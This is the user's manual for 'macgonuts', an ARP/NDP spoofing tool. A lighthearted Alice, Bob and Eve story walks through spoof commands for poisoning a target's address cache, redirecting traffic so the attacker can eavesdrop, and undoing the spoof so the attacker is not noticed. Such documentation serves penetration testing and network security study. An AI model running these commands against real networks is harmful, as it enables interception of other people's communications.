# Macgonuts user's manual

**Abstract**: This document provides information about how to use all features currently implemented on
``macgonuts`` tool. Any unclear or even untreated topic you can report
[here](https://github.com/rafael-santiago/macgonuts/issues) please and, thank you!

## Topics

- [What does ``macgonuts`` is for?](#what-does-macgonuts-is-for)
- [Basic facts about the command line tool](#basic-facts-about-the-command-line-tool)]
- [Commands](#commands)
    - [The spoof command](#the-spoof-command)

## What does ``macgonuts`` is for?

Besides a lousy pun, ``macgonuts`` is also a tool to exploit address resolution on networks.
Anyway, the main motivation to implement ``macgonuts`` was the possibility of using the lousy pun, I need to admit...
You can also understand ``macgonuts`` as a swiss army knife to exploit addressing resolution on computer networks, but
my main goal was to have something to use the pun.

[``Back``](#topics)

## Basic facts about the command line tool

1. This is about a ``unix-like`` tool.
2. It does not set on fireworks when a thing works.
3. It is based on commands.
4. When you want a quick help about a command you run: ``macgonuts help <command>``.
5. If you do not want to read this manual by preferring poke by yourself the tool: ``macgonuts help``.
6. If you still do not understand try to go to 1.

[``Back``](#topics)

## Commands

This section describes in detail all implemented commands in ``macgonuts``. Keep on reading to master up
the tool and making a youtube video about it.

### The spoof command

Maybe the ``spoof`` command is the command for what you arrive here. With ``spoof`` command you can deceive
a host by making it think that you are the droid that it was looking for...

If you run:

```
ford@RestaurantAtTheEndOfTheUniverse:~# macgonuts help spoof
use: macgonuts spoof --lo-iface=<label>
                     --target-addr=<ip4|ip6> --addr2spoof=<ip4|ip6>
                    [--fake-pkts-amount=<n> --timeout=<ms> --redirect --undo-spoof]
```

Okay, it expects at least three options:

- ``--lo-iface``
- ``--target-addr``
- ``--addr2spoff``

Nice, it does support ``ARP`` and ``NDP`` because options related to addressing supports ``ipv4`` or ``ipv6``.

The option ``--lo-iface`` stands for "local interface" you need to indicate the interface that your
machine uses to access the network that you are wanting to.. err... mess up... Anyway,
the option ``--target-addr`` is where you indicate the address of the host that you want to deceive
and ``--addr2spoof`` option is where you input the address that you want to override on target host.

Now, story time!!!!!!

Once upon time, three persons: Alice, Bob and Eve:

- Alice is on host ``192.30.70.8``.
- Bob is on host ``192.30.70.10``.
- Eve is on host ``192.30.70.9``.

Eve wants to use ``macgonuts`` to make Bob think that she is Alice on the network. So Eve run:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8
```

After emitting this command on her terminal, Eve starts to watch the following messages:

```
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
(...)
```

Eve's screen will be flooded with this info, now you imagine the network... Eve the barbarian I would say...
In fact, the spoof is done, at this moment ``192.30.70.10`` (Bob) thinks that ``192.30.70.8`` (Alice) is
``192.30.70.9`` (Eve).

If Eve wants to avoid flooding the network with so many packets she can pass ``--timeout=<mss>`` option:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=500
```

The same effect of the prior command but now at each half second ``macgonuts`` will inject in the network one
fake ``ARP`` resolution.

Nice, but Eve also wants to avoid interrupting any communication between Alice <-> Bob, in this way she can sit on
and eavesdropping (what a nice pun, huh?!) their channel. It can be done by passing ``--redirect`` flag:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=500 --redirect
```

Same effect, still spoofed but now redirecting packets and do not abusing network throughput.

Eve hits ``ctrl+c`` to exit the application (by the way, this is how you exit spoof command, sorry!). However,
Bob stills think that Eve's computer is Alice's computer and at this moment he will notice that "Alice"
stopped respond to his requests. If Eve wants to become incognito, she can pass the option ``--undo-spoof``:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=500 --redirect --undo-spoof
```

Once ``macgonuts`` got an exit request it will stop flooding network with fake packets and
restore the MAC resolution on target host, in other words, it do some housekeeping before going home
(...well, I think you understood anyway).

If flooding network is not an option Eve also could send only a specific amount of fake resolution
packets by using ``--fake-pkts-amount=<n>``:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=3000 --fake-pkts-amount=50
> --redirect --undo-spoof
```

**Tip**: When you do redirect it has already some implicit timeout, in this way, maybe you do not have to pass an
explicit timeout, depending on how much of timeout you are intending between fake resolution packets.

Congrats! Now you are a macgonuts spoofing master!

[``Back``](#topics)
